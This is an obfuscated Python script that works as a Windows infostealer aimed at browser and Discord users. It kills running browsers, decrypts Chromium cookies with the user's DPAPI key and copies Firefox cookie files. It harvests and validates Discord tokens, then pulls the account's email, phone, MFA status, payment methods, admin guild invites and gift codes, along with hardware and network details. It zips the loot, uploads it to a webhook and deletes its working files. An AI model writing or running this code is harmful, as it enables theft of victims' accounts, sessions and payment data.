lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll, lllllllllllIllI, lllllllllllIlIl, lllllllllllIlII, lllllllllllIIll = int, Exception, range, len, bool, bytes, print, KeyError, FileNotFoundError, UnicodeDecodeError, list, str, open

import os as lIIlIIlIIlIlII
import re as IllIIIllIlIIll
import wmi as llIIIIllIlIlII
import sys as IlIllIIIIlIIll
import json as lIlIlIllIIlllI
import time as lIIlllIlIIIlII
import uuid as IIllIlIlIlIIlI
import py7zr as lllllIlllIllIl
import base64 as IIIIlIIIlIllIl
import random as IIllIllIIlllIl
import psutil as IlIIllIIllIIII
import sqlite3 as IlIIIIlIIlIIII
import platform as IlllIlIIlllIll
import requests as IIlIIlllIIlllI
import subprocess as IlIIllIlIIlllI
from shutil import copy2 as lIlIlllIIllIII, rmtree as lIIlIIllIlIIIl
from Cryptodome.Cipher import AES as IlIllIIIIIlIII
from win32crypt import CryptUnprotectData as IllIllIIlIlIll

IIIllIIllIIlIlIlll = 'webhook here'

def IlllIIIlIlIIllIlII():
    lIIllIlIIlIlIllIII = ''.join((IIllIllIIlllIl.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in lllllllllllllIl(IIllIllIIlllIl.randint(7, 13))))
    return lIIllIlIIlIlIllIII
lllIIllllIlIIIlIll = lIIlIIlIIlIlII.getenv('LOCALAPPDATA')
lIllIIIlllIIIIIIII = lIIlIIlIIlIlII.getenv('APPDATA')
lIllIlllIllIlIIIll = IlllIIIlIlIIllIlII()
lIIlIIIIllllIIIIIl = 'C:\\Users\\Public'
try:
    lIIlIIllIlIIIl(f'{lIIlIIIIllllIIIIIl}\\sycillia')
except lllllllllllIlll:
    pass
lIIlIIlIIlIlII.makedirs(f'{lIIlIIIIllllIIIIIl}\\{lIllIlllIllIlIIIll}')
lIIlIIlIIlIlII.makedirs(f'{lIIlIIIIllllIIIIIl}\\sycillia')
with lllllllllllIIll(f'{lIIlIIIIllllIIIIIl}\\sycillia\\silence.txt', 'w', encoding='utf-8') as llIlllIllIIIlIlIII:
    llIlllIllIIIlIlIII.write(f'############\n# {IlllIIIlIlIIllIlII()} #\n############\n\n\n')
llllIIIIIlllIIlIII = ['chrome.exe', 'brave.exe', 'vivaldi.exe', 'msedge.exe', 'thorium.exe', 'yandex.exe', 'firefox.exe', 'librewolf.exe', 'waterfox.exe', 'opera.exe', 'kometa.exe', 'orbitum.exe', 'centbrowser.exe', '7star.exe', 'sputnik.exe', 'epicprivacybrowser.exe', 'uran.exe', 'iridium.exe']
IIIIllIIllllIlIIII = {'google-chrome-sxs': lllIIllllIlIIIlIll + '\\Google\\Chrome SxS\\User Data', 'google-chrome': lllIIllllIlIIIlIll + '\\Google\\Chrome\\User Data', 'brave': lllIIllllIlIIIlIll + '\\BraveSoftware\\Brave-Browser\\User Data', 'vivaldi': lllIIllllIlIIIlIll + '\\Vivaldi\\User Data', 'microsoft-edge': lllIIllllIlIIIlIll + '\\Microsoft\\Edge\\User Data', 'thorium': lllIIllllIlIIIlIll + '\\Thorium\\User Data', 'yandex': lllIIllllIlIIIlIll + '\\Yandex\\YandexBrowser\\User Data', 'firefox': lIllIIIlllIIIIIIII + '\\Mozilla\\Firefox\\Profiles', 'librewolf': lIllIIIlllIIIIIIII + '\\Librewolf\\Profiles', 'waterfox': lIllIIIlllIIIIIIII + '\\Waterfox\\Profiles', 'opera': lIllIIIlllIIIIIIII + '\\Opera Software\\Opera Stable', 'opera-gx': lIllIIIlllIIIIIIII + '\\Opera Software\\Opera GX Stable', 'kometa': lllIIllllIlIIIlIll + '\\Kometa\\User Data', 'orbitum': lllIIllllIlIIIlIll + '\\Orbitum\\User Data', 'cent-browser': lllIIllllIlIIIlIll + '\\CentBrowser\\User Data', '7star': lllIIllllIlIIIlIll + '\\7Star\\7Star\\User Data', 'sputnik': lllIIllllIlIIIlIll + '\\Sputnik\\Sputnik\\User Data', 'epic-privacy-browser': lllIIllllIlIIIlIll + '\\Epic Privacy Browser\\User Data', 'uran': lllIIllllIlIIIlIll + '\\uCozMedia\\Uran\\User Data', 'iridium': lllIIllllIlIIIlIll + '\\Iridium\\User Data', 'amigo': lllIIllllIlIIIlIll + '\\Kometa\\User Data'}
IlIlllllIllIllIllI = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
IlIlIllllIlllllIll = {'discord': lIllIIIlllIIIIIIII + '\\discord\\Local Storage\\leveldb\\', 'discord-ptb': lIllIIIlllIIIIIIII + '\\discordptb\\Local Storage\\leveldb\\', 'discord-canary': lIllIIIlllIIIIIIII + '\\discordcanary\\Local Storage\\leveldb\\', 'lightcord': lIllIIIlllIIIIIIII + '\\Lightcord\\Local Storage\\leveldb\\'}
IIlIlIIIIIllIlllIl = {0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
lIllIlIIIIIllllllI = {1: 'Credit Card', 2: 'PayPal'}
IlIlllIllIIllIIlll = 'https://discord.com/api/v9/users/@me'
lIlllIlllIllIlIIIl = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
IlIIIlllIlIlIIIlll = 'dQw4w9WgXcQ:[^\\"]*'
(IIIlIlllIIllllIlIl, IIllIIIIIIlllIIIIl) = ([], [])

def llIIIIlIIlIIlIllll():
    for IlIIIIllIIIlIllIIl in llllIIIIIlllIIlIII:
        for IIIlIlIlllllIIllII in IlIIllIIllIIII.process_iter():
            if IIIlIlIlllllIIllII.name() == IlIIIIllIIIlIllIIl:
                IIIlIlIlllllIIllII.kill()

def IlIlllllllllIIlIII(lIIlIlIlIIIIIllIII: lllllllllllIlII, lIIlIlIlIIIlllIlIl: lllllllllllIlII) -> lllllllllllIlIl:
    lllIllIlIIIIIIlIll = []
    if lIIlIlIlIIIIIllIII in ['firefox', 'waterfox', 'librewolf']:
        llIlIllIllIIllIlII = lIIlIIlIIlIlII.listdir(lIIlIlIlIIIlllIlIl)
        for llIlIIlllIIllIlllI in llIlIllIllIIllIlII:
            IIIIlIIIIIllllIIlI = f'{lIIlIlIlIIIlllIlIl}\\{llIlIIlllIIllIlllI}'
            with lllllllllllIIll(f'{IIIIlIIIIIllllIIlI}\\times.json', 'r', encoding='utf-8') as llIlllIllIIIlIlIII:
                llIIllIIlIIIIlIlll = lIlIlIllIIlllI.load(llIlllIllIIIlIlIII)
            if llIIllIIlIIIIlIlll.get('firstUse') is not None:
                lllIllIlIIIIIIlIll.append(llIlIIlllIIllIlllI)
    else:
        for llIlIIlllIIllIlllI in IlIlllllIllIllIllI:
            IIIIlIIIIIllllIIlI = f'{lIIlIlIlIIIlllIlIl}\\{llIlIIlllIIllIlllI}'
            if lIIlIIlIIlIlII.path.isdir(IIIIlIIIIIllllIIlI):
                lllIllIlIIIIIIlIll.append(llIlIIlllIIllIlllI)
    return lllIllIlIIIIIIlIll

def llllIllIllllIlllll(lllIllIIIIllllIlll: lllllllllllIlII) -> lllllllllllIlII:
    try:
        if not lIIlIIlIIlIlII.path.isfile(lllIllIIIIllllIlll):
            return None
        with lllllllllllIIll(lllIllIIIIllllIlll, 'r', encoding='utf-8') as llIlllIllIIIlIlIII:
            lIIIllIlIlIlIIlIlI = lIlIlIllIIlllI.load(llIlllIllIIIlIlIII)
        IlIllllIlIIlIIIIlI = lIIIllIlIlIlIIlIlI['os_crypt']['encrypted_key']
        IlIllllIlIIlIIIIlI = IIIIlIIIlIllIl.b64decode(IlIllllIlIIlIIIIlI)[5:]
        IllIIlIlIIIIlIIlIl = IllIllIIlIlIll(IlIllllIlIIlIIIIlI, None, None, None, 0)[1]
        return IllIIlIlIIIIlIIlIl
    except llllllllllllllI as lIIIIlIIIIIlIIllIl:
        llllllllllllIIl(f"Couldn't retrieve master key: {lIIIIlIIIIIlIIllIl}")
        return None

def llllIlIIlIIlIllllI():
    for (IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll) in IIIIllIIllllIlIIII.items():
        if not lIIlIIlIIlIlII.path.isdir(lllIllIIIIllllIlll):
            continue
        IllIIlIlIIIIlIIlIl = llllIllIllllIlllll(f'{lllIllIIIIllllIlll}\\Local State')
        IlIIIIIlIlIlIllIIl = IlIlllllllllIIlIII(IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll)
        for llIlIIlllIIllIlllI in IlIIIIIlIlIlIllIIl:
            IlIlllllIIIIlllIIl(IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll, llIlIIlllIIllIlllI, IllIIlIlIIIIlIIlIl)

def IlllllllIllIIlIIll(llIIIllIIIlIllIllI: llllllllllllIlI, IllIIlIlIIIIlIIlIl: llllllllllllIlI) -> lllllllllllIlII:
    try:
        if llIIIllIIIlIllIllI[:3] == b'v10' or llIIIllIIIlIllIllI[:3] == b'v11':
            lIIIlllllIIIIIIlIl = llIIIllIIIlIllIllI[3:15]
            IIlIllIlIIIIIIIlll = llIIIllIIIlIllIllI[15:]
            llIlIllIIIllIlIllI = IlIllIIIIIlIII.new(IllIIlIlIIIIlIIlIl, IlIllIIIIIlIII.MODE_GCM, lIIIlllllIIIIIIlIl)
            lllIllllllllIlllIl = llIlIllIIIllIlIllI.decrypt(IIlIllIlIIIIIIIlll)
            lllIllllllllIlllIl = lllIllllllllIlllIl[:-16].decode()
            return lllIllllllllIlllIl
        else:
            return ''
    except llllllllllllllI as lIIIIlIIIIIlIIllIl:
        llllllllllllIIl(f'Decryption error: {lIIIIlIIIIIlIIllIl}')
        return ''

def llllIIlIIIIllIlIII(llIIIllIIIlIllIllI: llllllllllllIlI, IllIIlIlIIIIlIIlIl: llllllllllllIlI) -> lllllllllllIlII:
    try:
        lIIIlllllIIIIIIlIl = llIIIllIIIlIllIllI[3:15]
        IIlIllIlIIIIIIIlll = llIIIllIIIlIllIllI[15:]
        llIlIllIIIllIlIllI = IlIllIIIIIlIII.new(IllIIlIlIIIIlIIlIl, IlIllIIIIIlIII.MODE_GCM, lIIIlllllIIIIIIlIl)
        lllIllllllllIlllIl = llIlIllIIIllIlIllI.decrypt(IIlIllIlIIIIIIIlll)
        lllIllllllllIlllIl = lllIllllllllIlllIl[:-16]
        try:
            IIllIlIllllIIIIlIl = lllIllllllllIlllIl.decode('utf-8')
            return IIllIlIllllIIIIlIl
        except lllllllllllIllI:
            return lllIllllllllIlllIl.hex()
    except llllllllllllllI as lIIIIlIIIIIlIIllIl:
        llllllllllllIIl(f'Decryption error: {lIIIIlIIIIIlIIllIl}')
        return ''

def IlIlllllIIIIlllIIl(IlIlllIlIIlIlIlIIl: lllllllllllIlII, lllIllIIIIllllIlll: lllllllllllIlII, llIlIIlllIIllIlllI: lllllllllllIlII, IllIIlIlIIIIlIIlIl: lllllllllllIlII):
    if IlIlllIlIIlIlIlIIl in ['firefox', 'librewolf', 'waterfox']:
        lIlIlllIIllIII(f'{lllIllIIIIllllIlll}\\{llIlIIlllIIllIlllI}\\cookies.sqlite', f'{lIIlIIIIllllIIIIIl}\\sycillia\\{IlIlllIlIIlIlIlIIl}_cookies_{IlllIIIlIlIIllIlII()}.sqlite')
        return
    if IlIlllIlIIlIlIlIIl in ['opera', 'opera-gx']:
        IIIlIlllIlIIIlIIIl = lllIllIIIIllllIlll + '\\Network\\Cookies'
    else:
        IIIlIlllIlIIIlIIIl = f'{lllIllIIIIllllIlll}\\{llIlIIlllIIllIlllI}\\Network\\Cookies'
    if not lIIlIIlIIlIlII.path.isfile(IIIlIlllIlIIIlIIIl):
        return
    lIlIlllIIllIII(IIIlIlllIlIIIlIIIl, lIllIlllIllIlIIIll)
    IlIllIlIlllIIllllI = IlIIIIlIIlIIII.connect(lIllIlllIllIlIIIll)
    lIlIIIIllIlIIllIIl = IlIllIlIlllIIllllI.cursor()
    with lllllllllllIIll(f'{lIIlIIIIllllIIIIIl}\\sycillia\\silence.txt', 'a', encoding='utf-8') as llIlllIllIIIlIlIII:
        llIlllIllIIIlIlIII.write(f'\nBrowser - {IlIlllIlIIlIlIlIIl} | Profile - {llIlIIlllIIllIlllI}\n\n\n')
        for lllIIIlIIlIIlIllll in lIlIIIIllIlIIllIIl.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall():
            (IlIllllllIIllIlllI, IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll, llIlIllIIIllIIlIIl, IlIlIlIlIlllIlIlll) = lllIIIlIIlIIlIllll
            IllllIlllIIIllllII = IlllllllIllIIlIIll(llIlIllIIIllIIlIIl, IllIIlIlIIIIlIIlIl)
            if '' not in [IlIllllllIIllIlllI, IlIlllIlIIlIlIlIIl, IllllIlllIIIllllII]:
                llIlllIllIIIlIlIII.write(f"{IlIllllllIIllIlllI}\t{('FALSE' if IlIlIlIlIlllIlIlll == 0 else 'TRUE')}\t{lllIllIIIIllllIlll}\t{('FALSE' if IlIllllllIIllIlllI.startswith('.') else 'TRUE')}\t{IlIlIlIlIlllIlIlll}\t{IlIlllIlIIlIlIlIIl}\t{IllllIlllIIIllllII}\n")
    lIlIIIIllIlIIllIIl.close()
    IlIllIlIlllIIllllI.close()
    lIIlIIlIIlIlII.remove(lIllIlllIllIlIIIll)
    return

def lIIIllIlllIIIllIll(llIlIlIIlllIlIlIIl: lllllllllllIlII) -> llllllllllllIll:
    IllllllIlIIIIIIlII = IIlIIlllIIlllI.get(IlIlllIllIIllIIlll, headers={'Authorization': llIlIlIIlllIlIlIIl})
    if IllllllIlIIIIIIlII.status_code == 200:
        return True
    return False

def IIIlIIIIIIlIlIIIlI(llIlIlIIlllIlIlIIl: lllllllllllIlII) -> lllllllllllIlII:
    llIIlIlllllllIlIIl = IIlIIlllIIlllI.get(IlIlllIllIIllIIlll, headers={'Authorization': llIlIlIIlllIlIlIIl}).json()['id']
    return llIIlIlllllllIlIIl

def lIIllIIllIIIlllIlI():
    for (IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll) in IlIlIllllIlllllIll.items():
        if not lIIlIIlIIlIlII.path.exists(lIllIIIlllIIIIIIII + f'\\{IlIlllIlIIlIlIlIIl}\\Local State'):
            continue
        for lIIIlIIIlIlIllIIII in lIIlIIlIIlIlII.listdir(lllIllIIIIllllIlll):
            if lIIIlIIIlIlIllIIII[-3:] not in ['log', 'ldb']:
                continue
            with lllllllllllIIll(f'{lllIllIIIIllllIlll}\\{lIIIlIIIlIlIllIIII}', 'r', errors='ignore') as IIlIIllIIlIIIlllII:
                for IllIlIllIlIlIIllII in [lIllllIIlIIllIIIIl.strip() for lIllllIIlIIllIIIIl in IIlIIllIIlIIIlllII.readlines() if lIllllIIlIIllIIIIl.strip()]:
                    for IIIIIIIIlIIlIlIlII in IllIIIllIlIIll.findall(IlIIIlllIlIlIIIlll, IllIlIllIlIlIIllII):
                        try:
                            IlllllllllIllIlIIl = IIIIIIIIlIIlIlIlII.split('dQw4w9WgXcQ:')[1]
                            IllIIlIIIIIllllIlI = IIIIlIIIlIllIl.b64decode(IlllllllllIllIlIIl)
                            IllIIlIlIIIIlIIlIl = llllIllIllllIlllll(f'{lIllIIIlllIIIIIIII}\\{IlIlllIlIIlIlIlIIl}\\Local State')
                            llIlIlIIlllIlIlIIl = llllIIlIIIIllIlIII(IllIIlIIIIIllllIlI, IllIIlIlIIIIlIIlIl)
                            if lIIIllIlllIIIllIll(llIlIlIIlllIlIlIIl):
                                llIIlIlllllllIlIIl = IIIlIIIIIIlIlIIIlI(llIlIlIIlllIlIlIIl)
                                if llIIlIlllllllIlIIl not in IIllIIIIIIlllIIIIl:
                                    IIIlIlllIIllllIlIl.append(llIlIlIIlllIlIlIIl)
                                    IIllIIIIIIlllIIIIl.append(llIIlIlllllllIlIIl)
                        except llllllllllllllI as lIIIIlIIIIIlIIllIl:
                            llllllllllllIIl(f'Error processing token: {lIIIIlIIIIIlIIllIl}')

def lIIIlllIllIIIlIIlI():
    for (IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll) in IIIIllIIllllIlIIII.items():
        IlIIIIIlIlIlIllIIl = IlIlllllllllIIlIII(IlIlllIlIIlIlIlIIl, lllIllIIIIllllIlll)
        for llIlIIlllIIllIlllI in IlIIIIIlIlIlIllIIl:
            if IlIlllIlIIlIlIlIIl in ['firefox', 'librewolf', 'waterfox']:
                for (lIIlllIlllIlllIlll, llIllIIIIlIIlIIIII, IIIIIIlIIIlIlIllII) in lIIlIIlIIlIlII.walk(lllIllIIIIllllIlll):
                    for IIlIIllIIlIIIlllII in IIIIIIlIIIlIlIllII:
                        if not IIlIIllIIlIIIlllII.endswith('.sqlite'):
                            continue
                        with lllllllllllIIll(lIIlIIlIIlIlII.path.join(lIIlllIlllIlllIlll, IIlIIllIIlIIIlllII), errors='ignore') as llIlllIllIIIlIlIII:
                            for IllIlIllIlIlIIllII in [lIllllIIlIIllIIIIl.strip() for lIllllIIlIIllIIIIl in llIlllIllIIIlIlIII if lIllllIIlIIllIIIIl.strip()]:
                                for llIlIlIIlllIlIlIIl in IllIIIllIlIIll.findall(lIlllIlllIllIlIIIl, IllIlIllIlIlIIllII):
                                    if lIIIllIlllIIIllIll(llIlIlIIlllIlIlIIl):
                                        llIIlIlllllllIlIIl = IIIlIIIIIIlIlIIIlI(llIlIlIIlllIlIlIIl)
                                        if llIIlIlllllllIlIIl not in IIllIIIIIIlllIIIIl:
                                            IIIlIlllIIllllIlIl.append(llIlIlIIlllIlIlIIl)
                                            IIllIIIIIIlllIIIIl.append(llIIlIlllllllIlIIl)
            if IlIlllIlIIlIlIlIIl in ['opera', 'opera-gx']:
                IlIIlIIlIllIlIIIIl = lIIlIIlIIlIlII.path.join(lllIllIIIIllllIlll, 'Local Storage', 'leveldb')
            else:
                IlIIlIIlIllIlIIIIl = lIIlIIlIIlIlII.path.join(lllIllIIIIllllIlll, llIlIIlllIIllIlllI, 'Local Storage', 'leveldb')
            if lIIlIIlIIlIlII.path.exists(IlIIlIIlIllIlIIIIl):
                for lIIIlIIIlIlIllIIII in lIIlIIlIIlIlII.listdir(IlIIlIIlIllIlIIIIl):
                    if lIIIlIIIlIlIllIIII[-3:] not in ['log', 'ldb']:
                        continue
                    with lllllllllllIIll(lIIlIIlIIlIlII.path.join(IlIIlIIlIllIlIIIIl, lIIIlIIIlIlIllIIII), errors='ignore') as llIlllIllIIIlIlIII:
                        for IllIlIllIlIlIIllII in [lIllllIIlIIllIIIIl.strip() for lIllllIIlIIllIIIIl in llIlllIllIIIlIlIII if lIllllIIlIIllIIIIl.strip()]:
                            for llIlIlIIlllIlIlIIl in IllIIIllIlIIll.findall(lIlllIlllIllIlIIIl, IllIlIllIlIlIIllII):
                                if lIIIllIlllIIIllIll(llIlIlIIlllIlIlIIl):
                                    llIIlIlllllllIlIIl = IIIlIIIIIIlIlIIIlI(llIlIlIIlllIlIlIIl)
                                    if llIIlIlllllllIlIIl not in IIllIIIIIIlllIIIIl:
                                        IIIlIlllIIllllIlIl.append(llIlIlIIlllIlIlIIl)
                                        IIllIIIIIIlllIIIIl.append(llIIlIlllllllIlIIl)

def IlIIIllIIIlIIllIll():
    lIIllIIllIIIlllIlI()
    lIIIlllIllIIIlIIlI()
    if not IIIlIlllIIllllIlIl:
        return
    for llIlIlIIlllIlIlIIl in IIIlIlllIIllllIlIl:
        IllIlIlllIIlIIIlII = IIlIIlllIIlllI.get('https://discord.com/api/v8/users/@me', headers={'Authorization': llIlIlIIlllIlIlIIl}).json()
        lIIIIlllIlIIIIlIIl = IIlIIlllIIlllI.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': llIlIlIIlllIlIlIIl}).json()
        IlllllllllllIlIlII = IIlIIlllIIlllI.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': llIlIlIIlllIlIlIIl}).json()
        llIlllIlIlIIlllIlI = IIlIIlllIIlllI.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': llIlIlIIlllIlIlIIl}).json()
        lIIIllIIllIIlIlIIl = IllIlIlllIIlIIIlII['username']
        llIllIIlllllIllIlI = IllIlIlllIIlIIIlII['id']
        lIlIIIIllIIIIlIlIl = IllIlIlllIIlIIIlII.get('email', 'N/A')
        llIIlIlIlIlIIlIlIl = IllIlIlllIIlIIIlII.get('phone', 'N/A')
        IIlIIIIIllIlIllIII = IllIlIlllIIlIIIlII.get('mfa_enabled', 'N/A')
        IIIIIIIllIlIIIllII = f"https://cdn.discordapp.com/avatars/{llIllIIlllllIllIlI}/{IllIlIlllIIlIIIlII['avatar']}.gif"
        if IIlIIlllIIlllI.get(IIIIIIIllIlIIIllII).status_code != 200:
            IIIIIIIllIlIIIllII = f"https://cdn.discordapp.com/avatars/{llIllIIlllllIllIlI}/{IllIlIlllIIlIIIlII['avatar']}.png"
        lIIlllllllIlIIlllI = IIlIlIIIIIllIlllIl.get(IllIlIlllIIlIIIlII.get('premium_type', ''), 'None')
        IlIIIlllIIIlIIlIll = ', '.join((payment_type_map.get(method['type'], 'Unknown') for method in lIIIIlllIlIIIIlIIl)) if lIIIIlllIlIIIIlIIl else None
        lllllIIlllIIIIIIIl = []
        if IlllllllllllIlIlII:
            for IIIlllllIIllllIlIl in IlllllllllllIlIlII:
                IIlIIIllIIllIlllll = lllllllllllllll(IIIlllllIIllllIlIl['permissions']) & 8 != 0
                if IIlIIIllIIllIlllll and IIIlllllIIllllIlIl.get('approximate_member_count', 0) >= 100:
                    IIIlIIIllIlIIIlIIl = IIIlllllIIllllIlIl.get('owner', False)
                    IlIIlIlIlIIlIlIIIl = IIlIIlllIIlllI.get(f"https://discord.com/api/v8/guilds/{IIIlllllIIllllIlIl['id']}/invites", headers={'Authorization': llIlIlIIlllIlIlIIl}).json()
                    try:
                        lIIIIlIlllIlIlllll = 'https://discord.gg/' + IlIIlIlIlIIlIlIIIl[0]['code'] if IlIIlIlIlIIlIlIIIl else None
                    except llllllllllllIII:
                        lIIIIlIlllIlIlllll = None
                    IIlIlIIIIlllllIlIl = f"\n\nGuild Name: {IIIlllllIIllllIlIl['name']} (ID: {IIIlllllIIllllIlIl['id']})\nOwner? {IIIlIIIllIlIIIlIIl}\n\nMembers (Offline): {IIIlllllIIllllIlIl.get('approximate_member_count', 0)}\nMembers (Online): {IIIlllllIIllllIlIl.get('approximate_presence_count', 0)}\nMembers (DnD): {IIIlllllIIllllIlIl.get('approximate_member_count', 0) - IIIlllllIIllllIlIl.get('approximate_presence_count', 0)}\n\nInvite: {lIIIIlIlllIlIlllll}\n\n"
                    if lllllllllllllII('\n'.join(lllllIIlllIIIIIIIl)) + lllllllllllllII(IIlIlIIIIlllllIlIl) >= 1024:
                        break
                    lllllIIlllIIIIIIIl.append(IIlIlIIIIlllllIlIl)
        lllllIIlllIIIIIIIl = '\n'.join(lllllIIlllIIIIIIIl) if lllllIIlllIIIIIIIl else None
        IIIllIlIIlIIllIlIl = []
        if llIlllIlIlIIlllIlI:
            for IIIIIlIIlIIlIlIlIl in llIlllIlIlIIlllIlI:
                lIIlIIlIlllIllllll = IIIIIlIIlIIlIlIlIl['promotion']['outbound_title']
                IIllllIIIIIlIIIlIl = IIIIIlIIlIIlIlIlIl['code']
                IIlIlIIIIlllllIlIl = f'Gift: `{lIIlIIlIlllIllllll}`\nCode: `{IIllllIIIIIlIIIlIl}`'
                if lllllllllllllII('\n\n'.join(IIIllIlIIlIIllIlIl)) + lllllllllllllII(IIlIlIIIIlllllIlIl) >= 1024:
                    break
                IIIllIlIIlIIllIlIl.append(IIlIlIIIIlllllIlIl)
            IIIllIlIIlIIllIlIl = '\n\n'.join(IIIllIlIIlIIllIlIl) if IIIllIlIIlIIllIlIl else None
        with lllllllllllIIll(f'{lIIlIIIIllllIIIIIl}\\sycillia\\harmony.txt', 'a', encoding='utf-8') as llIlllIllIIIlIlIII:
            llIlllIllIIIlIlIII.write(f'\n\nUsername: {lIIIllIIllIIlIlIIl} ({llIllIIlllllIllIlI})\nEmail: {lIlIIIIllIIIIlIlIl}\nPhone Number: {llIIlIlIlIlIIlIlIl}\nMFA: {IIlIIIIIllIlIllIII}\nToken: {llIlIlIIlllIlIlIIl}\n\nBilling Information:\n{IlIIIlllIIIlIIlIll}\n\nHQ Guilds (if any):\n{lllllIIlllIIIIIIIl}\n\nGift Codes (if any):\n{IIIllIlIIlIIllIlIl}\n\n\n')

def llIIlIlIIIIllIIlII():
    IIIIIlIIIlIlIllIll = llIIIIllIlIlII.WMI()
    IlIllIIIIlllIllllI = IIIIIlIIIlIlIllIll.Win32_Processor()[0]
    lIllIIIIlIlIllllll = IIIIIlIIIlIlIllIll.Win32_ComputerSystem()[0]
    IlIlIIllIIIIlllllI = IIIIIlIIIlIlIllIll.Win32_LogicalDisk()[0]
    lllIIlIIlIllIIllII = IIIIIlIIIlIlIllIll.Win32_VideoController()[0]
    lIlIlIllIlllIllIII = IIllIlIlIlIIlI.getnode()
    llIIllllIllllIlIIl = ':'.join(['{:02x}'.format(lIlIlIllIlllIllIII >> lllIllIIllllIIlIIl & 255) for lllIllIIllllIIlIIl in lllllllllllllIl(0, 8 * 6, 8)][::-1])
    IlllllIlIIllIIlIlI = IlIIllIlIIlllI.check_output(['ipconfig', '/all'])
    lIllIllIlIIIIlIlIl = IlllllIlIIllIIlIlI.decode('utf-8')
    with lllllllllllIIll(f'{lIIlIIIIllllIIIIIl}\\sycillia\\aware.txt', 'a', encoding='utf-8') as llllllIIIIlIlIllIl:
        llllllIIIIlIlIllIl.write(f'\n############\n# {IlllIIIlIlIIllIlII()} #\n############\n\n\n\n\n### SYSINFO\n\nWindows {IlllIlIIlllIll.system()} {IlllIlIIlllIll.release()} ( {IlllIlIIlllIll.version()} ) {IlllIlIIlllIll.win32_edition()}\n64-bits? {IlIllIIIIlIIll.maxsize > 2 ** 32} ( {IlllIlIIlllIll.machine()} )\n\nCPU: {IlIllIIIIlllIllllI.name} ( {IlllIlIIlllIll.processor()} )\nCPU Speed: {IlIllIIIIlllIllllI.MaxClockSpeed}\nTotal Physical Memory: {lllllllllllllll(lIllIIIIlIlIllllll.TotalPhysicalMemory) // (1024 * 1024)} MB\nFree Disk Space: {lllllllllllllll(IlIlIIllIIIIlllllI.FreeSpace) // (1024 * 1024)} MB\n\nGraphics Card: {lllIIlIIlIllIIllII.name}\nVideo Processor: {lllIIlIIlIllIIllII.VideoProcessor}\nDriver Date: {lllIIlIIlIllIIllII.DriverDate}\nMax Refresh Rate: {lllIIlIIlIllIIllII.MaxRefreshRate}\nMin Refresh Rate: {lllIIlIIlIllIIllII.MinRefreshRate}\nVideo Mode Desc.: {lllIIlIIlIllIIllII.VideoModeDescription}\nInstalled Display Drivers:\n{lllIIlIIlIllIIllII.InstalledDisplayDrivers}\n\nComputer Network Name: {IlllIlIIlllIll.node()}\nMAC Address: {llIIllllIllllIlIIl}\nAdapters:\n{lIllIllIlIIIIlIlIl}\n\nRaw Data:\nHD(s): {IIIIIlIIIlIlIllIll.Win32_LogicalDisk()}\n\nMem: {IIIIIlIIIlIlIllIll.Win32_ComputerSystem()}\n\nCPU(s): {IIIIIlIIIlIlIllIll.Win32_Processor()}\n')

def lIlIIlIlllIlIIIllI():
    with lllllIlllIllIl.SevenZipFile(f'{lIIlIIIIllllIIIIIl}\\sycillia.7z', 'w') as lIIIlIIIIlIlIlllll:
        lIIIlIIIIlIlIlllll.writeall(f'{lIIlIIIIllllIIIIIl}\\sycillia', arcname=lIIlIIlIIlIlII.path.basename(f'{lIIlIIIIllllIIIIIl}\\{lIllIlllIllIlIIIll}'))
    IIlIIlllIIlllI.post(IIIllIIllIIlIlIlll, files={'file': lllllllllllIIll(f'{lIIlIIIIllllIIIIIl}\\sycillia.7z', 'rb')})
llIIIIlIIlIIlIllll()
llllIlIIlIIlIllllI()
IlIIIllIIIlIIllIll()
llIIlIlIIIIllIIlII()
lIlIIlIlllIlIIIllI()
lIIlIIllIlIIIl(f'{lIIlIIIIllllIIIIIl}\\{lIllIlllIllIlIIIll}')
lIIlIIllIlIIIl(f'{lIIlIIIIllllIIIIIl}\\sycillia')
lIIlIIlIIlIlII.remove(f'{lIIlIIIIllllIIIIIl}\\sycillia.7z')
